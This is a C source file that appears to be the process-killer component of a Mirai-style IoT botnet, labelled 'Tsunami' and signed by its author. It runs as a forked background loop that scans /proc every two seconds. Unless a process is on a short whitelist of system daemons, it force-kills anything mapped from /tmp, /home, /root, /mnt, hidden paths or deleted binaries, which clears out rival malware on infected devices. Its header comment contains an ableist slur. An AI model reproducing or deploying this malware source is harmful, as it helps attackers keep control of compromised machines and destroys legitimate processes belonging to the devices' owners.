#ifdef TSUNAMI_KILLER
#include <unistd.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <linux/limits.h>
#include <sys/types.h>
#include <dirent.h>
#include <signal.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <stdio.h>
/*
    Incredibly RETARDED Maps Killer By Enemyy. P.S god was here.
    Designed To Kill Anything Running Out Of A Dir Which Malware Commonly Infects And Get Executed In.
*/
void killer_maps() {
    DIR *dir;
    struct dirent *file;
    dir = opendir("/proc/");
    while(file = readdir(dir)) {
    int i;
    int a;
    int fd, pid;
    char rdmaps[100], rdmapspath[25];

    pid = atoi(file->d_name);
    
    if(pid == getpid() || pid == getppid() || pid == 0) goto end; // Skipping system procs, our proc, and non pid dirs.
  
    sprintf(rdmapspath, "/proc/%d/maps", pid); // Putting pid into readable directory

    fd = open(rdmapspath, O_RDONLY);
    read(fd, rdmaps, sizeof(rdmaps) - 1); 
    close(fd);  
    /* This Is Our Whitelist For Sys Process's - Enemyy */
  if(strstr(rdmaps, "/usr/lib/systemd/systemd") ||    
   strstr(rdmaps, "/usr/libexec/openssh/sftp-server") ||   
   strstr(rdmaps, "/usr/bin") ||    
   strstr(rdmaps, "/usr/sbin") ||   
   strstr(rdmaps, "/usr/lib") ||    
   strstr(rdmaps, "/var/lib") ||    
   strstr(rdmaps, "/var/spool") ||  
   strstr(rdmaps, "/var/Sofia") ||
   strstr(rdmaps, "sshd") ||        
   strstr(rdmaps, "bash") ||        
   strstr(rdmaps, "httpd") ||       
   strstr(rdmaps, "telnetd") ||     
   strstr(rdmaps, "dropbear") ||    
   strstr(rdmaps, "ropbear") ||     
   strstr(rdmaps, "encoder")) goto end;       

  /* Common Dir's Which Malware Get Executed In */
  if(strstr(rdmaps, "/tmp") ||            
   strstr(rdmaps, "/var/run/") || ///mnt
   strstr(rdmaps, "/mnt") ||
   strstr(rdmaps, "/root") ||
   strstr(rdmaps, "/var/tmp") ||
   strstr(rdmaps, "/boot") ||
   strstr(rdmaps, "/.") ||           
   strstr(rdmaps, "(deleted)") ||     
   strstr(rdmaps, "/home")) kill(pid,9);

     end:;
     memset(rdmaps, 0, sizeof(rdmaps)); 
  }
}
int killer_boot() {
    int childpid;
    childpid = fork();
    if(childpid > 0 || childpid == 1) return;
    while(1) {
        killer_maps();
        sleep(2);
    }
}
#endif
